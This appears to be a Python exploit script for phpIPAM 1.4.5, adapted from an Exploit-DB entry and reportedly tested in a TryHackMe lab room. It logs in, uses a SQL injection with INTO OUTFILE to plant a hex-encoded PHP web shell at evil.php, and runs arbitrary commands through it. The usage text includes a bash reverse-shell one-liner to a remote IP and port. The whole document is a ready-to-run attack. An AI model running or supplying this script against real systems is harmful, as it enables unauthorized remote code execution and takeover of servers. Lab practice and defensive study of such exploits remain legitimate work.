# phpIPAM 1.4.5 - SQLI to Authenticated Remote Code Execution

# Tested on "Ollie" Room (TryHackMe)

# Based on:
# https://www.exploit-db.com/exploits/50963

import sys
import requests
import urllib3
import urllib.parse
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def login(s, url, username, password):
	data = {
	"ipamusername": username,
	"ipampassword": password
	}
	print(f"[+] Trying to log in as {username}")
	r = s.post(f"{url}/app/login/login_check.php", data=data)
	if "Invalid username or password" in r.text:
		print(f"[-] There's an error when trying to log in using these credentials --> {username}:{password}")
		exit()
	else:
		print("[+] Login successful !\n")
		return str(r.cookies['phpipam'])

def exploit(s, url, auth_cookie, command):
	print("[+] Exploiting with the phpIPAM session")
	vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
	data = {
	"subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/evil.php' -- -",
	"bgp_id": "1"
	}
	cookies = {
	"phpipam": auth_cookie
	}
	s.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
	test = s.get(f"{url}/evil.php")
	if test.status_code != 200:
		return print(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1")
	print(f"[+] Success! The shell is located at ")
	cmd_req = f"{url}/evil.php?cmd={urllib.parse.quote(command)}"
	print(f'\t{cmd_req}')
	r = s.get(cmd_req)
	res = r.text.encode().replace(b'1\t \x1c', b'').replace(b' \x1d\t3\t4\n', b'').decode()
	print(f"\n\n[+] Output:\n\n{res}")

def show_usage():
	print('[+] Usage: %s <TARGET_URL> <USERNAME> <PASSWORD> <COMMAND>' % sys.argv[0])
	print('[+] Example: %s http://www.target.com "admin" "password123" "id"' % sys.argv[0])
	print('[+] Example: %s http://www.target.com "admin" "password123" "bash -c \'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1\'"' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] phpIPAM 1.4.5 - SQLI to Authenticated Remote Code Execution\n')
	try:
		url = sys.argv[1].strip()
		username = sys.argv[2].strip()
		password = sys.argv[3].strip()
		command = sys.argv[4].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
		auth_cookie = login(s, url, username, password)
		exploit(s, url, auth_cookie, command)

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
		print('[-] Set up proxy on localhost:8080 <!>')
		print('[-] Or comment line 74 "s.proxies = proxies" <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
